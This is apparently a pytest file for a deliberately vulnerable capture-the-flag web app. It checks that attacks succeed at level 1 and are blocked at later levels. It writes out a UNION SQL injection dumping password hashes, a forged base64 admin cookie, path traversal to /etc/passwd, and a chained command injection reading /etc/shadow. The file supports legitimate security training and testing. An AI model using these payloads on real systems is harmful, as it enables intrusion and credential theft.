import base64
import hashlib
import hmac
import os
import tempfile
import time
import pytest

from modules.webapp.config import Config
from modules.webapp.db import init_db
from modules.webapp.seed import seed_db
from modules.webapp.app import create_app


def _make_app(level: int):
    class DynamicConfig(Config):
        CTF_LEVEL = level
        TESTING = True
        SECRET_KEY = "pwnsat_ground_station_2026"

    db_fd, db_path = tempfile.mkstemp(suffix=f"_lvl{level}.db")
    app_instance = create_app(DynamicConfig, db_path=db_path)
    with app_instance.app_context():
        init_db()
        seed_db()
    return app_instance, db_fd, db_path


def test_level1_vulnerabilities():
    app, db_fd, db_path = _make_app(level=1)
    client = app.test_client()

    # 1. SQLi in telemetry
    payload = "' UNION SELECT 1,username,password_hash,role,5,6,7,8,9,10,11,12,13 FROM users--"
    resp_sqli = client.get(f"/api/telemetry?search={payload}&limit=100")
    assert resp_sqli.status_code == 200
    assert any("5f4dcc3b" in str(list(r.values())) for r in resp_sqli.get_json())

    # 2. Insecure Base64 token accepted
    token = base64.b64encode(b"admin:admin:9999999999").decode()
    client.set_cookie("session_token", token)
    resp_panel = client.get("/api/admin/panel")
    assert resp_panel.status_code == 200
    assert "LVL1" in resp_panel.get_json()["flag"]

    # 3. LFI allows traversal
    resp_lfi = client.get("/api/logs", query_string={"file": "../" * 10 + "etc/passwd"})
    assert resp_lfi.status_code == 200
    assert "root:" in resp_lfi.get_json()["content"]

    # 4. RCE allows shell execution
    resp_rce = client.post("/api/diagnostics", json={"cmd": "id"})
    assert resp_rce.status_code == 200
    assert "uid=" in resp_rce.get_json()["output"]

    os.close(db_fd)
    if os.path.exists(db_path):
        os.unlink(db_path)


def test_level2_vulnerabilities_and_hardening():
    app, db_fd, db_path = _make_app(level=2)
    client = app.test_client()

    # 1. SQLi is parameterized (UNION injection does not return users)
    payload = "' UNION SELECT 1,username,password_hash,role,5,6,7,8,9,10,11,12,13 FROM users--"
    resp_sqli = client.get(f"/api/telemetry?search={payload}&limit=100")
    assert resp_sqli.status_code == 200
    assert not any("5f4dcc3b" in str(list(r.values())) for r in resp_sqli.get_json())

    # 2. Insecure Base64 token still accepted in Level 2
    token = base64.b64encode(b"admin:admin:9999999999").decode()
    client.set_cookie("session_token", token)
    resp_panel = client.get("/api/admin/panel")
    assert resp_panel.status_code == 200
    assert "LVL2" in resp_panel.get_json()["flag"]

    # 3. LFI still works in Level 2
    resp_lfi = client.get("/api/logs", query_string={"file": "../" * 10 + "etc/passwd"})
    assert resp_lfi.status_code == 200
    assert "root:" in resp_lfi.get_json()["content"]

    os.close(db_fd)
    if os.path.exists(db_path):
        os.unlink(db_path)


def test_level3_security_hardening():
    app, db_fd, db_path = _make_app(level=3)
    client = app.test_client()

    # 1. Insecure Base64 token without HMAC is REJECTED
    unsigned_token = base64.b64encode(b"admin:admin:9999999999").decode()
    client.set_cookie("session_token", unsigned_token)
    resp_unauth = client.get("/api/admin/panel")
    assert resp_unauth.status_code == 302 or resp_unauth.status_code == 401

    # 2. Signed HMAC token is ACCEPTED
    ts = str(int(time.time()))
    payload = f"admin:admin:{ts}"
    signature = hmac.new(b"pwnsat_ground_station_2026", payload.encode(), hashlib.sha256).hexdigest()
    signed_token = base64.b64encode(f"{payload}|{signature}".encode()).decode()
    client.set_cookie("session_token", signed_token)
    resp_auth = client.get("/api/admin/panel")
    assert resp_auth.status_code == 200
    assert "LVL3" in resp_auth.get_json()["flag"]

    # 3. RCE is restricted to command whitelist in Level 3
    resp_rce_blocked = client.post("/api/diagnostics", json={"cmd": "whoami; cat /etc/shadow"})
    assert resp_rce_blocked.status_code == 403

    resp_rce_allowed = client.post("/api/diagnostics", json={"cmd": "id"})
    assert resp_rce_allowed.status_code == 200

    # 4. LFI traversal is blocked in Level 3
    resp_lfi_blocked = client.get("/api/logs", query_string={"file": "../../../../etc/passwd"})
    assert resp_lfi_blocked.status_code in (403, 404)

    os.close(db_fd)
    if os.path.exists(db_path):
        os.unlink(db_path)
